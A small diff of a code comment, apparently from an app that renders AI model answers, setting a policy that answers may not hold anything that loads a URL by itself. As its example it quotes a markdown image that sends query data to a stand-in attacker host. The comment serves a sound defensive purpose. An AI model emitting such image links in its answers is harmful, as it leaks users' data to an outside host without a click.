@@ -1,4 +1,4 @@
-// What a model answer may render (RB11). Answers are text and tables, so nothing that loads
+// What a model answer may render. Answers are text and tables, so nothing that loads
 // a URL by itself is allowed: a markdown image such as ![](https://attacker.example/?d=...)
 // would make the browser send query data to that host with no click. Links stay, but only
 // to http(s) pages, and MarkdownRenderer opens them with rel="noopener noreferrer".
